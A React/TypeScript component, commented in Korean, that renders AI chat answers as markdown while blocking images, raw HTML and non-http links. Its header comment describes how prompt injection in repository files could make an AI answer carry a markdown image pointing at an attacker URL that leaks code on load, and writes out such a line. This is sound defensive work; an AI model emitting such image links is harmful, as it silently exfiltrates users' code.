"use client";

// AI 채팅 답변의 마크다운 렌더링.
//
// react-markdown 을 쓰는 이유: HTML 문자열을 끼워 넣지 않고 React 요소로 만들어서 기본값이
// 안전하다(답변 속 <script> 는 글자로만 보인다). AI 답변은 레포 파일 속 프롬프트 인젝션으로
// 조작될 수 있는 입력이라, 직접 짠 파서보다 "기본이 안전한" 쪽을 골랐다.
//
// 그 위에 우리가 더 막는 것:
// - 이미지: 그리지 않는다. `![](https://공격자?d=코드)` 를 그리면 브라우저가 이미지를 불러오는
//   요청만으로 내용이 밖으로 샌다 — 사용자가 아무것도 누르지 않아도.
// - 원본 HTML: skipHtml 로 버린다. rehype-raw 같은 확장은 넣지 않는다.
// - 링크: http(s) 만 링크로 만들고 새 탭 + noopener noreferrer.

import { memo, useEffect, useMemo, useState } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import type { Monaco } from "@monaco-editor/react";
import { Check, Copy } from "lucide-react";
import { MONACO_THEME, setupMonaco } from "@/lib/monaco-theme";

const REMARK_PLUGINS = [remarkGfm];

/** 코드펜스 언어 이름 → Monaco 언어 id. 목록에 없으면 색칠하지 않고 글자 그대로 둔다. */
const FENCE_LANGUAGES: Record<string, string> = {
  ts: "typescript",
  tsx: "typescript",
  typescript: "typescript",
  js: "javascript",
  jsx: "javascript",
  mjs: "javascript",
  cjs: "javascript",
  javascript: "javascript",
  json: "json",
  sh: "shell",
  bash: "shell",
  zsh: "shell",
  shell: "shell",
  py: "python",
  python: "python",
  html: "html",
  css: "css",
  yaml: "yaml",
  yml: "yaml",
  sql: "sql",
  md: "markdown",
  markdown: "markdown",
};

let monacoPromise: Promise<Monaco> | null = null;

/**
 * 색칠용 Monaco. 폴더 화면은 파일 보기에서 이미 Monaco 를 불러오므로 거의 공짜다.
 * setTheme 까지 해야 색 클래스(.mtkN) 스타일이 문서에 들어간다 — 에디터가 아직 안 떴어도
 * 코드블록이 색을 갖게. 실패하면 다음에 다시 시도하도록 캐시를 비운다.
 */
function loadMonaco(): Promise<Monaco> {
  monacoPromise ??= import("@monaco-editor/react")
    .then(({ loader }) => loader.init())
    .then((monaco) => {
      setupMonaco(monaco);
      monaco.editor.setTheme(MONACO_THEME);
      return monaco;
    })
    .catch((error: unknown) => {
      monacoPromise = null;
      throw error;
    });
  return monacoPromise;
}

function CodeBlock({ code, lang, streaming }: { code: string; lang?: string; streaming: boolean }) {
  const [html, setHtml] = useState<{ code: string; value: string } | null>(null);
  const [copied, setCopied] = useState(false);
  const languageId = lang ? FENCE_LANGUAGES[lang.toLowerCase()] : undefined;

  // 색칠은 스트리밍이 끝난 뒤 한 번만. 글자마다 하면 조각이 올 때마다 Monaco 토크나이저를 돈다.
  useEffect(() => {
    if (streaming || !languageId) return;
    let cancelled = false;
    loadMonaco()
      .then((monaco) => monaco.editor.colorize(code, languageId, { tabSize: 2 }))
      .then((value) => {
        if (!cancelled) setHtml({ code, value });
      })
      .catch(() => {
        /* 색칠 실패는 글자 그대로 보여주면 된다 */
      });
    return () => {
      cancelled = true;
    };
  }, [code, languageId, streaming]);

  useEffect(() => {
    if (!copied) return;
    const timer = setTimeout(() => setCopied(false), 1500);
    return () => clearTimeout(timer);
  }, [copied]);

  // 색칠 결과가 지금 코드의 것일 때만 쓴다(스트리밍 중에 옛 결과가 남지 않게).
  const colored = !streaming && html?.code === code ? html.value : null;

  return (
    <div className="border-border my-2 overflow-hidden rounded-lg border bg-black">
      <div className="border-border text-muted-foreground flex h-7 items-center justify-between border-b pr-1 pl-2.5 text-xs">
        <span className="font-mono">{lang || "code"}</span>
        <button
          type="button"
          onClick={() => {
            void navigator.clipboard.writeText(code).then(() => setCopied(true));
          }}
          className="hover:text-foreground hover:bg-muted flex items-center gap-1 rounded px-1.5 py-0.5 transition-colors"
          aria-label="코드 복사"
        >
          {copied ? <Check className="size-3.5" /> : <Copy className="size-3.5" />}
          {copied ? "복사됨" : "복사"}
        </button>
      </div>
      {/* 코드는 줄바꿈하지 않고 이 블록 안에서만 가로 스크롤 — 들여쓰기가 무너지지 않게. */}
      <pre className="overflow-x-auto p-3 font-mono text-xs leading-relaxed">
        {colored ? (
          // Monaco colorize 는 토큰 글자를 이스케이프한 <span> 만 돌려준다. 답변 원문을 HTML 로
          // 넣는 게 아니라 Monaco 가 만든 색 마크업만 넣는다.
          <code dangerouslySetInnerHTML={{ __html: colored }} />
        ) : (
          <code>{code}</code>
        )}
      </pre>
    </div>
  );
}

const isSafeHref = (href: string | undefined): href is string =>
  !!href && /^https?:\/\//i.test(href);

function buildComponents(streaming: boolean): Components {
  return {
    p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{children}</p>,
    h1: ({ children }) => (
      <h3 className="mt-4 mb-2 text-base font-semibold first:mt-0">{children}</h3>
    ),
    h2: ({ children }) => (
      <h3 className="mt-4 mb-2 text-base font-semibold first:mt-0">{children}</h3>
    ),
    h3: ({ children }) => (
      <h4 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>
    ),
    h4: ({ children }) => (
      <h4 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>
    ),
    h5: ({ children }) => (
      <h4 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>
    ),
    h6: ({ children }) => (
      <h4 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>
    ),
    ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5">{children}</ul>,
    ol: ({ children }) => <ol className="my-2 list-decimal space-y-1 pl-5">{children}</ol>,
    blockquote: ({ children }) => (
      <blockquote className="border-border text-muted-foreground my-2 border-l-2 pl-3">
        {children}
      </blockquote>
    ),
    hr: () => <hr className="border-border my-4" />,
    a: ({ href, children }) =>
      isSafeHref(href) ? (
        <a
          href={href}
          target="_blank"
          rel="noopener noreferrer"
          className="text-brand-cobalt underline underline-offset-2"
        >
          {children}
        </a>
      ) : (
        <span>{children}</span>
      ),
    img: ({ alt }) => (
      <span className="text-muted-foreground">[이미지{alt ? `: ${alt}` : ""}]</span>
    ),
    table: ({ children }) => (
      <div className="my-2 overflow-x-auto">
        <table className="w-full border-collapse text-xs">{children}</table>
      </div>
    ),
    th: ({ children }) => (
      <th className="border-border bg-muted border px-2 py-1 text-left font-semibold">
        {children}
      </th>
    ),
    td: ({ children }) => <td className="border-border border px-2 py-1">{children}</td>,
    // 코드펜스는 <pre><code> 로 온다. 틀은 CodeBlock 이 그리므로 pre 는 벗긴다.
    pre: ({ children }) => <>{children}</>,
    code: ({ className, children }) => {
      const text = String(children ?? "");
      const lang = /language-(\S+)/.exec(className ?? "")?.[1];
      // 언어 표시가 있거나 여러 줄이면 코드펜스, 아니면 문장 속 인라인 코드.
      if (!lang && !text.includes("\n")) {
        return (
          <code className="bg-muted rounded px-1 py-0.5 font-mono text-[0.85em]">{children}</code>
        );
      }
      return <CodeBlock code={text.replace(/\n$/, "")} lang={lang} streaming={streaming} />;
    },
  };
}

/** AI 답변 한 개. streaming 이면 코드 색칠을 미룬다. */
export const ChatMarkdown = memo(function ChatMarkdown({
  text,
  streaming,
}: {
  text: string;
  streaming: boolean;
}) {
  const components = useMemo(() => buildComponents(streaming), [streaming]);
  return (
    <div className="wrap-break-word">
      <ReactMarkdown remarkPlugins={REMARK_PLUGINS} skipHtml components={components}>
        {text}
      </ReactMarkdown>
    </div>
  );
});
